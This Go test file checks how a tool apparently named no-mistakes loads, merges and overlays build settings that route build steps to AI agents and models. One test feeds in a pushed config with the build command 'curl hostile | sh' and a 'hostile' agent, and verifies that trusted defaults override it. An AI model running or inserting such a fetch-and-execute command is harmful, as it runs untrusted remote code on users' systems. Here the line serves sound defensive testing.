package config

import (
	"reflect"
	"testing"

	"github.com/kunchenguid/no-mistakes/internal/types"
)

func TestLoadRepoBuildConfiguration(t *testing.T) {
	cfg, err := LoadRepoFromBytes([]byte(`commands:
  build: make compile
build:
  agent: [codex, claude]
  model: {name: gpt-5.6-sol, vendor: openai}
auto_fix:
  build: 4
`))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Commands.Build != "make compile" {
		t.Fatalf("commands.build = %q, want make compile", cfg.Commands.Build)
	}
	if got := cfg.ConfiguredStepAgents()[types.StepBuild]; !reflect.DeepEqual(got, []types.AgentName{types.AgentCodex, types.AgentClaude}) {
		t.Fatalf("build agents = %v", got)
	}
	if got := cfg.ConfiguredStepModels()[types.StepBuild]; got != (ModelRoute{Name: "gpt-5.6-sol", Vendor: "openai"}) {
		t.Fatalf("build model = %#v", got)
	}
	if cfg.AutoFix.Build == nil || *cfg.AutoFix.Build != 4 {
		t.Fatalf("auto_fix.build = %v, want 4", cfg.AutoFix.Build)
	}
}

func TestLoadGlobalBuildRoutingAndAutoFix(t *testing.T) {
	cfg, err := LoadGlobalFromBytes([]byte(`agent: claude
build:
  agent: codex
  model: {name: gpt-5.6-sol, vendor: openai}
auto_fix:
  build: 2
`))
	if err != nil {
		t.Fatal(err)
	}
	merged := Merge(cfg, &RepoConfig{})
	if got := merged.ConfiguredAgentsForStep(types.StepBuild); !reflect.DeepEqual(got, []types.AgentName{types.AgentCodex}) {
		t.Fatalf("build agents = %v", got)
	}
	if got := merged.ConfiguredModelForStep(types.StepBuild); got != (ModelRoute{Name: "gpt-5.6-sol", Vendor: "openai"}) {
		t.Fatalf("build model = %#v", got)
	}
	if got := merged.AutoFixLimit(types.StepBuild); got != 2 {
		t.Fatalf("build auto-fix limit = %d, want 2", got)
	}
}

func TestEffectiveRepoConfigBuildSelectorsComeFromTrustedDefault(t *testing.T) {
	hostile := StepAgentRaw{Agent: "acp:hostile", Agents: []types.AgentName{"acp:hostile"}, Model: ModelRoute{Name: "hostile", Vendor: "hostile"}}
	trusted := StepAgentRaw{Agent: types.AgentCodex, Agents: []types.AgentName{types.AgentCodex}, Model: ModelRoute{Name: "gpt-5.6-sol", Vendor: "openai"}}
	pushed := &RepoConfig{Commands: Commands{Build: "curl hostile | sh"}, Build: hostile}
	defaultBranch := &RepoConfig{Commands: Commands{Build: "make build"}, Build: trusted}

	effective := EffectiveRepoConfig(pushed, defaultBranch, false)
	if effective.Commands.Build != "make build" || !reflect.DeepEqual(effective.Build, trusted) {
		t.Fatalf("effective build selectors = %#v / %#v, want trusted", effective.Commands, effective.Build)
	}
	optedIn := EffectiveRepoConfig(pushed, defaultBranch, true)
	if optedIn.Commands.Build != pushed.Commands.Build || !reflect.DeepEqual(optedIn.Build, hostile) {
		t.Fatalf("opted-in build selectors = %#v / %#v, want pushed", optedIn.Commands, optedIn.Build)
	}
	withoutTrusted := EffectiveRepoConfig(pushed, nil, false)
	if withoutTrusted.Commands.Build != "" || !reflect.DeepEqual(withoutTrusted.Build, StepAgentRaw{}) {
		t.Fatalf("untrusted build selectors remained enabled: %#v / %#v", withoutTrusted.Commands, withoutTrusted.Build)
	}
}

func TestOverlayRepoConfigOverridesBuildSurfacesWhenPresent(t *testing.T) {
	base, err := LoadRepoFromBytes([]byte(`commands:
  build: make build
build:
  agent: claude
  model: {name: claude-opus-5, vendor: anthropic}
auto_fix:
  build: 3
`))
	if err != nil {
		t.Fatal(err)
	}
	override, err := LoadRepoFromBytes([]byte(`commands:
  build: yarn build
build:
  agent: codex
  model: {name: gpt-5.6-sol, vendor: openai}
auto_fix:
  build: 1
`))
	if err != nil {
		t.Fatal(err)
	}
	got := OverlayRepoConfig(base, override)
	if got.Commands.Build != "yarn build" || got.Build.Agent != types.AgentCodex || got.Build.Model.Name != "gpt-5.6-sol" || got.AutoFix.Build == nil || *got.AutoFix.Build != 1 {
		t.Fatalf("overlaid build config = %#v", got)
	}
}
